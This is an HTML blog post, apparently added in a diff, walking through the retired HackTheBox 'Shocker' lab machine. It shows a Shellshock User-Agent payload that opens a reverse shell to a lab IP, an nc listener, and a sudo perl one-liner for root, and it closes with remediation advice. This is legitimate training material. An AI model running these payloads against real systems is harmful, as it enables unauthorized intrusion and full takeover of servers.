@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Shocker: Shellshock CGI to shell, perl sudo to root — Lucky Thandel</title>
+<meta name="description" content="A .sh in /cgi-bin plus a 2014 bug that never died (CVE-2014-6271), then a textbook perl NOPASSWD sudo for root. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-06 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Shocker: Shellshock CGI to shell, perl sudo to root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Shocker is a retired HackTheBox easy Linux machine named for exactly one bug: Shellshock. Synopsis: a .sh in /cgi-bin plus CVE-2014-6271, then a textbook perl NOPASSWD sudo for root.</p>
+<h2><span class="amber">$</span> Enumeration — find the CGI</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: scan and fuzz for cgi-bin</span>
+nmap -sC -sV 10.10.10.56
+gobuster dir -u http://10.10.10.56 -w common.txt -x sh,cgi,pl  # -&gt; /cgi-bin/user.sh</pre>
+<p>Apache with /cgi-bin/ containing user.sh — a CGI shell script. CGI plus bash plus 2014-era software is the whole threat model.</p>
+<h2><span class="amber">$</span> Foothold — Shellshock (CVE-2014-6271)</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: User-Agent RCE to reverse shell</span>
+curl -H &quot;User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.23/4444 0&gt;&amp;1&quot; http://10.10.10.56/cgi-bin/user.sh
+nc -lvnp 4444</pre>
+<p>Bash processes attacker-controlled CGI environment variables, so the crafted User-Agent executes server-side. Land as the low-privilege shelly user. Aim at user.sh — Shellshock needs the bash CGI execution path.</p>
+<h2><span class="amber">$</span> Privilege escalation — sudo perl</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: perl escape to root</span>
+sudo -l   # (root) NOPASSWD: /usr/bin/perl
+sudo perl -e 'exec &quot;/bin/sh&quot;;'
+id   # uid=0(root)</pre>
+<p>Perl can exec anything, so one sudo line is an instant root shell. Two CVEs, two one-liners, total compromise. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Testing the header against the main site instead of the CGI script, and forgetting URL-encoding quirks (prove the shape with a sleep/id callback first).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Patch bash everywhere, remove CGI where possible, and treat NOPASSWD on interpreters as passwordless root. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
